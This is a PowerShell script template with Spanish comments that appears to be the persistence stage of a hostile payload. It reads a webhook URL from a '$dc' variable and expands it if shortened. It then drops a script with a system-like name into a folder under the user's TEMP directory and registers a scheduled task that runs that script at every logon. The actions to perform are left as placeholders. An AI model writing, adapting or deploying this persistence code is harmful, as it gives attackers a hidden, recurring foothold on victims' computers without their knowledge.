$hookurl = "$dc"
$seconds = 30 # Intervalo entre acciones
$a = 1 # Cantidad de acciones

# Detección de URL acortada
if ($hookurl.Length -ne 121) {
    Write-Host "URL de webhook acortada detectada..." 
    $hookurl = (irm $hookurl).url
}

# Obtener la ruta de la carpeta temporal del usuario actual
$ScriptFolder = Join-Path -Path $env:TEMP -ChildPath "syswFolder"
if (-not (Test-Path -Path $ScriptFolder)) {
    New-Item -ItemType Directory -Path $ScriptFolder | Out-Null
}

# Obtener la ruta completa del script
$ScriptPath = Join-Path -Path $ScriptFolder -ChildPath "sysw.ps1"

# Crear el script en la ruta especificada si no existe
if (-not (Test-Path -Path $ScriptPath)) {
@"
# Inserta aquí las acciones que deseas realizar
Write-Host "Acción realizada"
"@ | Set-Content -Path $ScriptPath
}

# Función para crear la tarea programada
function CrearTareaProgramada {
    $TaskName = "TareaAlInicio"
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $ScriptPath
    $Trigger = New-ScheduledTaskTrigger -AtLogon
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -User $env:USERNAME -RunLevel Limited -Force
}

# Crear tarea programada si no existe
if (-not (Get-ScheduledTask -TaskName "TareaAlInicio" -ErrorAction SilentlyContinue)) {
    CrearTareaProgramada
}

# Bucle principal para realizar acciones
While ($a -gt 0) {
    # Insertar aquí las acciones a realizar
    Start-Sleep $seconds
    $a--
}
